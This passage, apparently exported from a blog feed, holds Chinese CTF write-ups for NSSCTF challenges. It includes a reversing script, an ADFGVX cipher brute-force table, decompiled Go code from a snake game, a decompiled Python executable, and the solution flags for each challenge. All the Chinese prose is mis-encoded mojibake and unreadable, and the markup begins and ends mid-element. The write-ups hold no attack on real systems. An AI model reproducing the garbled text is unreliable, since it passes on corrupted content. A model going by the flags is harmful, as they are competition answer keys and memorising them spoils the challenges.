~b1</span></span><br><span class="line"><span class="comment">#     not_2 = ~b2</span></span><br><span class="line"><span class="comment">#     or_not_num = not_2 | not_1</span></span><br><span class="line"><span class="comment">#     last[now_num - 1] = or_not_num &amp; or_num</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># now_num = 0</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># for i in range(32):</span></span><br><span class="line"><span class="comment">#     save = last[now_num]</span></span><br><span class="line"><span class="comment">#     now_num+=1</span></span><br><span class="line"><span class="comment">#     last[now_num-1] = now_num + save - 1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">31</span>,<span class="number">0</span>,-<span class="number">1</span>):</span><br><span class="line">    last[i]-=i</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">30</span>,-<span class="number">1</span>,-<span class="number">1</span>):</span><br><span class="line">    last[i]^=last[i+<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">pl(last)</span><br><span class="line"><span class="comment">#NSSCTF&#123;H@ppy_Ch1ne5_NEwY3ar!1!1&#125;</span></span><br></pre></td></tr></table></figure><h2 id="crypto">crypto</h2><h3 id="è¿‡å¹´æ¥ä¸‹æ£‹">è¿‡å¹´æ¥ä¸‹æ£‹</h3><p>XXVAF AVXAX DXFVX DXDVA XAGV</p><p>å¾ˆæ˜æ˜¾æ˜¯æ£‹ç›˜å¯†ç ADFGVX</p><p>æ ¹æ®å¯†æ–‡æ®µæ•°å‘ç°æ˜¯keyä¸º5ä½</p><p>å†™è„šæœ¬ç©·ä¸¾ï¼š</p><figure class="highlight ldif"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">4h9343nse2r4</span>: abcde</span><br><span class="line"><span class="attribute">4gl393mgewr8</span>: abced</span><br><span class="line"><span class="attribute">4h9343ise2rf</span>: abdce</span><br><span class="line"><span class="attribute">44lz934mbwr2</span>: abdec</span><br><span class="line"><span class="attribute">4bl393cgd2r3</span>: abecd</span><br><span class="line"><span class="attribute">4fl3l3fmdkr2</span>: abedc</span><br><span class="line"><span class="attribute">5b98405sy2r4</span>: acbde</span><br><span class="line"><span class="attribute">5al8904gywr8</span>: acbed</span><br><span class="line"><span class="attribute">5g99y0ls2erf</span>: acdbe</span><br><span class="line"><span class="attribute">94fh8344nsq2</span>: acdeb</span><br><span class="line"><span class="attribute">5al930fg1er3</span>: acebd</span><br><span class="line"><span class="attribute">9fflk3f4pgq2</span>: acedb</span><br><span class="line"><span class="attribute">5b984z6sy2m9</span>: adbce</span><br><span class="line"><span class="attribute">9alk934mgwq8</span>: adbec</span><br><span class="line"><span class="attribute">5g99yzrs2em9</span>: adcbe</span><br><span class="line"><span class="attribute">94fh8344isq2</span>: adceb</span><br><span class="line"><span class="attribute">9all33fmjeq3</span>: adebc</span><br><span class="line"><span class="attribute">9fflk3f4jmq2</span>: adecb</span><br><span class="line"><span class="attribute">4bl89y6gs2q9</span>: aebcd</span><br><span class="line"><span class="attribute">4fl8ly9mskq8</span>: aebdc</span><br><span class="line"><span class="attribute">4gl93yrgweq9</span>: aecbd</span><br><span class="line"><span class="attribute">49f5ky94ugq2</span>: aecdb</span><br><span class="line"><span class="attribute">44l53y9mteq3</span>: aedbc</span><br><span class="line"><span class="attribute">49f5ky94tmq2</span>: aedcb</span><br><span class="line"><span class="attribute">fh8948nse264</span>: bacde</span><br><span class="line"><span class="attribute">fgk998mgew68</span>: baced</span><br><span class="line"><span class="attribute">fh8948ise26f</span>: badce</span><br><span class="line"><span class="attribute">f4k5984mbw62</span>: badec</span><br><span class="line"><span class="attribute">fbk998cgd263</span>: baecd</span><br><span class="line"><span class="attribute">ffk9l8fmdk62</span>: baedc</span><br><span class="line"><span class="attribute">b58946zsy29m</span>: bcade</span><br><span class="line"><span class="attribute">b4k996ygyw9q</span>: bcaed</span><br><span class="line"><span class="attribute">bl8946ks2e9c</span>: bcdae</span><br><span class="line"><span class="attribute">r44h9343nse2</span>: bcdea</span><br><span class="line"><span class="attribute">bfk996eg1e90</span>: bcead</span><br><span class="line"><span class="attribute">rf4ll3f3pge2</span>: bceda</span><br><span class="line"><span class="attribute">b589450sy24r</span>: bdace</span><br><span class="line"><span class="attribute">f4kl99ymgw8q</span>: bdaec</span><br><span class="line"><span class="attribute">bl8945qs2e46</span>: bdcae</span><br><span class="line"><span class="attribute">r44h9343ise2</span>: bdcea</span><br><span class="line"><span class="attribute">ffkl99emje80</span>: bdeac</span><br><span class="line"><span class="attribute">rf4ll3f3jme2</span>: bdeca</span><br><span class="line"><span class="attribute">a5k9940gs28r</span>: beacd</span><br><span class="line"><span class="attribute">a9k9l43msk8q</span>: beadc</span><br><span class="line"><span class="attribute">alk994qgwe86</span>: becad</span><br><span class="line"><span class="attribute">m945ly93uge2</span>: becda</span><br><span class="line"><span class="attribute">a9k5948mte80</span>: bedac</span><br><span class="line"><span class="attribute">m945ly93tme2</span>: bedca</span><br><span class="line"><span class="attribute">lb984q5wa264</span>: cabde</span><br><span class="line"><span class="attribute">lal89q4kaw68</span>: cabed</span><br><span class="line"><span class="attribute">lg99yqlwee6f</span>: cadbe</span><br><span class="line"><span class="attribute">94b58846bs02</span>: cadeb</span><br><span class="line"><span class="attribute">lal93qfkde63</span>: caebd</span><br><span class="line"><span class="attribute">9fb9k8f6dg02</span>: caedb</span><br><span class="line"><span class="attribute">g5934rzwa29m</span>: cbade</span><br><span class="line"><span class="attribute">g4l39rykaw9q</span>: cbaed</span><br><span class="line"><span class="attribute">gl934rkwee9c</span>: cbdae</span><br><span class="line"><span class="attribute">645b98405sy2</span>: cbdea</span><br><span class="line"><span class="attribute">gfl39rekde90</span>: cbead</span><br><span class="line"><span class="attribute">6f5fl8f07gy2</span>: cbeda</span><br><span class="line"><span class="attribute">h499yn3wye4r</span>: cdabe</span><br><span class="line"><span class="attribute">94bl89y6gs2q</span>: cdaeb</span><br><span class="line"><span class="attribute">hf984n8wye46</span>: cdbae</span><br><span class="line"><span class="attribute">9m5g99y0ls2e</span>: cdbea</span><br><span class="line"><span class="attribute">9fbl89e6ja20</span>: cdeab</span><br><span class="line"><span class="attribute">9c5lf9e0j42y</span>: cdeba</span><br><span class="line"><span class="attribute">g4l93m3kse8r</span>: ceabd</span><br><span class="line"><span class="attribute">49b9k436sg2q</span>: ceadb</span><br><span class="line"><span class="attribute">gfl89m8kse86</span>: cebad</span><br><span class="line"><span class="attribute">4r54l430xg2e</span>: cebda</span><br><span class="line"><span class="attribute">49b58486ta20</span>: cedab</span><br><span class="line"><span class="attribute">4655f480t42y</span>: cedba</span><br><span class="line"><span class="attribute">lb984k6wa2c9</span>: dabce</span><br><span class="line"><span class="attribute">9ah8984naw08</span>: dabec</span><br><span class="line"><span class="attribute">lg99ykrweec9</span>: dacbe</span><br><span class="line"><span class="attribute">94b58845cs02</span>: daceb</span><br><span class="line"><span class="attribute">9ah938fnde03</span>: daebc</span><br><span class="line"><span class="attribute">9fb9k8f5dm02</span>: daecb</span><br><span class="line"><span class="attribute">g5934l0wa2fr</span>: dbace</span><br><span class="line"><span class="attribute">44h399ynaw3q</span>: dbaec</span><br><span class="line"><span class="attribute">gl934lqweef6</span>: dbcae</span><br><span class="line"><span class="attribute">645b984z6sy2</span>: dbcea</span><br><span class="line"><span class="attribute">4fh399ende30</span>: dbeac</span><br><span class="line"><span class="attribute">6f5fl8fz7my2</span>: dbeca</span><br><span class="line"><span class="attribute">h499yi3wyefr</span>: dcabe</span><br><span class="line"><span class="attribute">94bl89y5ms2q</span>: dcaeb</span><br><span class="line"><span class="attribute">hf984i8wyef6</span>: dcbae</span><br><span class="line"><span class="attribute">9m5g99yzrs2e</span>: dcbea</span><br><span class="line"><span class="attribute">9fbl89e5pa20</span>: dceab</span><br><span class="line"><span class="attribute">9c5lf9ezp42y</span>: dceba</span><br><span class="line"><span class="attribute">44h9343nse2r</span>: deabc</span><br><span class="line"><span class="attribute">49b9k435sm2q</span>: deacb</span><br><span class="line"><span class="attribute">4fh8948nse26</span>: debac</span><br><span class="line"><span class="attribute">4r54l43zxm2e</span>: debca</span><br><span class="line"><span class="attribute">49b58485ua20</span>: decab</span><br><span class="line"><span class="attribute">4655f48zu42y</span>: decba</span><br><span class="line"><span class="attribute">fbl89e6ja209</span>: eabcd</span><br><span class="line"><span class="attribute">ffl8le9pak08</span>: eabdc</span><br><span class="line"><span class="attribute">fgl93erjee09</span>: eacbd</span><br><span class="line"><span class="attribute">f9f5ke97cg02</span>: eacdb</span><br><span class="line"><span class="attribute">f4l53e9pbe03</span>: eadbc</span><br><span class="line"><span class="attribute">f9f5ke97bm02</span>: eadcb</span><br><span class="line"><span class="attribute">a5l39f0ja23r</span>: ebacd</span><br><span class="line"><span class="attribute">a9l3lf3pak3q</span>: ebadc</span><br><span class="line"><span class="attribute">all39fqjee36</span>: ebcad</span><br><span class="line"><span class="attribute">c99ble916gy2</span>: ebcda</span><br><span class="line"><span class="attribute">a9lz9f8pbe30</span>: ebdac</span><br><span class="line"><span class="attribute">c99ble915my2</span>: ebdca</span><br><span class="line"><span class="attribute">b4l93c3jye3r</span>: ecabd</span><br><span class="line"><span class="attribute">f9flkf37mg2q</span>: ecadb</span><br><span class="line"><span class="attribute">bfl89c8jye36</span>: ecbad</span><br><span class="line"><span class="attribute">fr9glf31rg2e</span>: ecbda</span><br><span class="line"><span class="attribute">f9fh8f87na20</span>: ecdab</span><br><span class="line"><span class="attribute">f69hff81n42y</span>: ecdba</span><br><span class="line"><span class="attribute">f4ll3f3pge2r</span>: edabc</span><br><span class="line"><span class="attribute">f9flkf37gm2q</span>: edacb</span><br><span class="line"><span class="attribute">fflk9f8pge26</span>: edbac</span><br><span class="line"><span class="attribute">fr9glf31lm2e</span>: edbca</span><br><span class="line"><span class="attribute">f9fh8f87ia20</span>: edcab</span><br><span class="line"><span class="attribute">f69hff81i42y</span>: edcba</span><br></pre></td></tr></table></figure><p>æ€»ä¸å¯èƒ½è®©æˆ‘ä¸€ä¸ªä¸€ä¸ªè¾“å§ã€‚ã€‚çœ‹åˆ°é¢˜ç›®</p><blockquote><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">æ–°å¹´å¿«ä¹å‘€ï¼æ¥ä¸€èµ·ä¸‹è±¡æ£‹å§ï¼æˆ‘éƒ½æ‘†å¥½å’¯~ ç¥æ„¿å¤§å®¶åœ¨æ–°çš„ä¸€å¹´é‡Œ luckyï¼flagæ ¼å¼ï¼šNSSCTF&#123;<span class="strong">**å­—æ¯å°å†™**</span>&#125;</span><br></pre></td></tr></table></figure></blockquote><p>å”¯ä¸€çš„äº”ä½keyç›²çŒœluckyï¼Œé‚£ä¹ˆNSSCTF{h499yn3wye4r}</p><h2 id="misc">misc</h2><h3 id="æ¸©é¦¨çš„é…’å§">æ¸©é¦¨çš„é…’å§</h3><p>çœ‹è§†é¢‘è¿‡å®Œæ‰€æœ‰å‰§æƒ…å³å¯æ‹¿flag</p><p>å®˜æ–¹wpæ˜¯éå†æ‰€æœ‰èŠ‚ç‚¹è¿”å›åå­—å«flagçš„å›¾ç‰‡æ¥å¾—åˆ°çš„</p><p>æ³¨æ„æœ‰ä¸€æ®µæœ‰5ä¸ªä¹±ç å’Œä¸­é—´æ­£å¥½ä¸€æ ·ï¼ŒçŒœæµ‹ï¼š</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml">NSSCTF</span><span class="template-variable">&#123;æ–°å¹´å¿«ä¹_ä¸è¦åœä¸‹æ¥å•Š_CTFer!&#125;</span></span><br></pre></td></tr></table></figure><h3 id="userssssssssss">userssssssssss</h3><p>è¿›å…¥åæŒ‰åˆ›å»ºæ—¥æœŸæ’åºï¼Œæœ€åæ˜¯laminousï¼Œæ‰“å¼€çœ‹åˆ°flag</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">NSSCTF</span>&#123;f9d04fc8-<span class="number">77</span>a6-<span class="number">4700</span>-b114-<span class="number">2</span>a071ff76ceb&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> é¢˜é›† </category>
          
          <category> CTF </category>
          
          <category> æ¯”èµ› </category>
          
      </categories>
      
      
        <tags>
            
            <tag> é€†å‘ </tag>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NSSCTF_r17é¢˜ç›®å¤ç°</title>
      <link href="/posts/b3e0bfc3.html"/>
      <url>/posts/b3e0bfc3.html</url>
      
        <content type="html"><![CDATA[<h2 id="RE">RE</h2><h3 id="snake">snake</h3><p>è¿™ä¸ªé¢˜æ˜¯æ¸¸æˆé¢˜ï¼Œç›¸å½“äºé€šå…³å°±å¯ä»¥å¾—åˆ°æœ€åçš„flagï¼Œå¯æƒœå½“æ—¶è¢«goçš„æŠ½è±¡ç»™è’™è”½äº†åŒçœ¼ï¼Œæ²¡æœ‰æƒ³å»åŠ¨è°ƒ</p><p>é€»è¾‘å¤§æ¦‚æ˜¯ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ( i = <span class="number">0LL</span>; i &lt; <span class="number">10</span>; i = v65 + <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v65 = i;</span><br><span class="line">    snake_pkg_app_Run(<span class="number">20</span>, <span class="number">20</span>, v0, v1, (_DWORD)v2, v3, v4, v5, v6, v57, v58);</span><br><span class="line">    v74 = v8;</span><br><span class="line">    v15 = runtime_convT64(v65, <span class="number">20</span>, v10, v1, (_DWORD)v2, v11, v12, v13, v14, v57);</span><br><span class="line">    *(_QWORD *)&amp;v74 = &amp;RTYPE_int;</span><br><span class="line">    *((_QWORD *)&amp;v74 + <span class="number">1</span>) = v15;</span><br><span class="line">    v1 = <span class="number">19</span>;</span><br><span class="line">    v2 = &amp;v74;</span><br><span class="line">    fmt_Fprintf(</span><br><span class="line">      (<span class="type">unsigned</span> <span class="type">int</span>)go_itab__os_File_io_Writer,</span><br><span class="line">      os_Stdout,</span><br><span class="line">      (<span class="type">unsigned</span> <span class="type">int</span>)<span class="string">&quot;%d Game round ends\n&quot;</span>,</span><br><span class="line">      <span class="number">19</span>,</span><br><span class="line">      (<span class="type">unsigned</span> <span class="type">int</span>)&amp;v74,</span><br><span class="line">      <span class="number">1</span>,</span><br><span class="line">      <span class="number">1</span>,</span><br><span class="line">      v16,</span><br><span class="line">      v17,</span><br><span class="line">      v57,</span><br><span class="line">      v58,</span><br><span class="line">      v59,</span><br><span class="line">      v60,</span><br><span class="line">      v61,</span><br><span class="line">      v62,</span><br><span class="line">      v63);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( i == <span class="number">10</span> &amp;&amp; qword_569E78 == <span class="number">400</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v73[<span class="number">0</span>] = &amp;RTYPE_string;</span><br><span class="line">    v73[<span class="number">1</span>] = &amp;off_4E5D98;</span><br><span class="line">    v18 = <span class="number">1</span>;</span><br><span class="line">    LODWORD(v19) = <span class="number">1</span>;</span><br><span class="line">    fmt_Fprintln(</span><br><span class="line">      (<span class="type">unsigned</span> <span class="type">int</span>)go_itab__os_File_io_Writer,</span><br><span class="line">      os_Stdout,</span><br><span class="line">      (<span class="type">unsigned</span> <span class="type">int</span>)v73,</span><br><span class="line">      <span class="number">1</span>,</span><br><span class="line">      <span class="number">1</span>,</span><br><span class="line">      v3,</span><br><span class="line">      v4,</span><br><span class="line">      v5,</span><br><span class="line">      v6,</span><br><span class="line">      v57,</span><br><span class="line">      v58,</span><br><span class="line">      v59,</span><br><span class="line">      v60,</span><br><span class="line">      v61);</span><br><span class="line">    v23 = snake_pkg_game_All_rand;</span><br><span class="line">    v71 = snake_pkg_game_All_rand;</span><br><span class="line">    v24 = qword_569E78;</span><br><span class="line">    v67 = qword_569E78;</span><br><span class="line">    v25 = <span class="number">0LL</span>;</span><br><span class="line">    v26 = <span class="number">0LL</span>;</span><br><span class="line">    v27 = <span class="number">0LL</span>;</span><br><span class="line">    <span class="keyword">while</span> ( v25 &lt; v24 )</span><br><span class="line">    &#123;</span><br><span class="line">      v66 = v25;</span><br><span class="line">      v64 = v26;</span><br><span class="line">      v70 = v27;</span><br><span class="line">      v28 = *(_QWORD *)(v23 + <span class="number">8</span> * v25);</span><br><span class="line">      v75 = v8;</span><br><span class="line">      v29 = runtime_convT64(v28, v27, v28, v18, v19, v24, v20, v21, v22, v57);</span><br><span class="line">      *(_QWORD *)&amp;v75 = &amp;RTYPE_int;</span><br><span class="line">      *((_QWORD *)&amp;v75 + <span class="number">1</span>) = v29;</span><br><span class="line">      v18 = fmt_Sprintf((<span class="type">unsigned</span> <span class="type">int</span>)<span class="string">&quot;%02x&quot;</span>, <span class="number">4</span>, (<span class="type">unsigned</span> <span class="type">int</span>)&amp;v75, <span class="number">1</span>, <span class="number">1</span>, v30, v31, v32, v33, v57, v58, v59, v60, v61);</span><br><span class="line">      v34 = v70;</span><br><span class="line">      v39 = runtime_concatstring2(<span class="number">0</span>, v70, v64, v18, <span class="number">4</span>, v35, v36, v37, v38, v57, v58, v59, v60, v61);</span><br><span class="line">      v23 = v71;</span><br><span class="line">      v24 = v67;</span><br><span class="line">      v19 = v39;</span><br><span class="line">      v25 = v66 + <span class="number">1</span>;</span><br><span class="line">      v26 = v34;</span><br><span class="line">      v27 = v19;</span><br><span class="line">    &#125;</span><br><span class="line">    *(_OWORD *)v69.h = v8;</span><br><span class="line">    v40 = &amp;v57 + <span class="number">12</span>;</span><br><span class="line">    v56 = &amp;v76;</span><br><span class="line">    ((<span class="type">void</span> (__fastcall *)(__int64 *))loc_45F36B)(v40);</span><br><span class="line">    *(_QWORD *)v69.h = <span class="number">0xEFCDAB8967452301</span>LL;</span><br><span class="line">    *(_QWORD *)&amp;v69.h[<span class="number">2</span>] = <span class="number">0x1032547698BADCFE</span>LL;</span><br><span class="line">    v69.h[<span class="number">4</span>] = <span class="number">-1009589776</span>;</span><br><span class="line">    *(_OWORD *)&amp;v69.nx = v8;</span><br><span class="line">    v46 = (uint8 *)runtime_stringtoslicebyte(</span><br><span class="line">                     (<span class="type">unsigned</span> <span class="type">int</span>)&amp;v68,</span><br><span class="line">                     v27,</span><br><span class="line">                     v41,</span><br><span class="line">                     (_DWORD)v40,</span><br><span class="line">                     v19,</span><br><span class="line">                     v42,</span><br><span class="line">                     v43,</span><br><span class="line">                     v44,</span><br><span class="line">                     v45,</span><br><span class="line">                     v57,</span><br><span class="line">                     v58,</span><br><span class="line">                     v59);</span><br><span class="line">    v77.cap = v47;</span><br><span class="line">    v77.len = v27;</span><br><span class="line">    v77.ptr = v46;</span><br><span class="line">    crypto_sha1__ptr_digest_Write(&amp;v69, v77);</span><br><span class="line">    v77.ptr = <span class="number">0LL</span>;</span><br><span class="line">    v77.len = <span class="number">0LL</span>;</span><br><span class="line">    v77.cap = <span class="number">0LL</span>;</span><br><span class="line">    v77 = crypto_sha1__ptr_digest_Sum(&amp;v69, v77);</span><br><span class="line">    v72 = v8;</span><br><span class="line">    v53 = runtime_convTslice(v48, v77.ptr, v77.len, <span class="number">0</span>, v19, v49, v50, v51, v52, v57, v58, v59);</span><br><span class="line">    *(_QWORD *)&amp;v72 = &amp;RTYPE__slice_uint8;</span><br><span class="line">    *((_QWORD *)&amp;v72 + <span class="number">1</span>) = v53;</span><br><span class="line">    fmt_Fprintf(</span><br><span class="line">      (<span class="type">unsigned</span> <span class="type">int</span>)go_itab__os_File_io_Writer,</span><br><span class="line">      os_Stdout,</span><br><span class="line">      (<span class="type">unsigned</span> <span class="type">int</span>)<span class="string">&quot;flag&#123;%x&#125;\n&quot;</span>,</span><br><span class="line">      <span class="number">9</span>,</span><br><span class="line">      (<span class="type">unsigned</span> <span class="type">int</span>)&amp;v72,</span><br><span class="line">      <span class="number">1</span>,</span><br><span class="line">      <span class="number">1</span>,</span><br><span class="line">      v54,</span><br><span class="line">      v55,</span><br><span class="line">      v57,</span><br><span class="line">      v58,</span><br><span class="line">      v59,</span><br><span class="line">      v60,</span><br><span class="line">      v61,</span><br><span class="line">      v62,</span><br><span class="line">      v63);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>æ ¹æ®æ±‡ç¼–ï¼ŒåŒ–ç®€é€»è¾‘æ˜¯</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">åˆ¤æ–­i <span class="operator">=</span><span class="operator">=</span> <span class="number">10</span></span><br><span class="line">ä¸æ˜¯ å†æ¥ä¸€è½®</span><br><span class="line">æ˜¯   åˆ¤æ–­qword_569E78 <span class="operator">=</span><span class="operator">=</span> <span class="number">400</span></span><br><span class="line">ä¸æ˜¯  ç»“æŸ</span><br><span class="line">æ˜¯    è¾“å‡ºflag</span><br></pre></td></tr></table></figure><p>ä»¥åŠç½‘ä¸Šæœ‰äººè¯´flagæ˜¯æ ¹æ®è¾“å…¥å˜æ¢çš„ï¼Œä½†æ˜¯æˆ‘åŠ¨æ€è°ƒè¯•çš„æ—¶å€™è¯•è¿‡ä¸åŒçš„å‘ç°flagéƒ½ä¸€æ ·ï¼Œä¸è¿‡è¿™ä¸ªä»£ç å¤ªæŠ½è±¡æˆ‘ä¹Ÿä¸çŸ¥é“flagæ€ä¹ˆæ‰“å‡ºæ¥çš„</p><p>æœ€åå°±æ˜¯åœ¨ç¬¬ä¸€ä¸ªåˆ¤æ–­0Açš„ä½ç½®ä¸‹æ–­ç‚¹ï¼Œä¸æ–­æ”¹å˜æ ‡å¿—ä½ï¼Œè®©ç¨‹åºåˆ°è¾¾è¾“å‡ºsuccessçš„ä½ç½®ï¼Œæœ€åè°ƒç”¨printf</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml">flag</span><span class="template-variable">&#123;da39a3ee5e6b4b0d3255bfef95601890afd80709&#125;</span></span><br></pre></td></tr></table></figure><h3 id="can-can-need-pxory">can_can_need_pxory</h3><p>è¿™ä¸ªé¢˜å®Œå…¨ä¸èƒ½ç†è§£ï¼ˆç°åœ¨ä¹Ÿæ˜¯ï¼‰</p><p>æ˜¯pyè½¬exeï¼Œå…ˆåç¼–è¯‘å‡ºpycï¼Œç„¶åå†åç¼–è¯‘æˆpy</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;ccccccccccccccccccccccccccccccccccc!&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;D0 U know C?&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;\n#include &lt;NSSCTF.h&gt;\nv01d bnssst(int FTC[], int lenggggggg) &#123;\n    int i, j, SSN;\n&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;This is CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;6L+Z5piv5L2g6KaB55qEZmxhZ+WQl++8nwpOU1NDVEZ7YjVlMzlkMDktODg3Yy1hZGI0LTE4OWMtMWI0OGEwNWJmOTY2fQ==&#x27;</span>)</span><br><span class="line">A = &#123;</span><br><span class="line">    <span class="string">&#x27;flag&#x27;</span>: <span 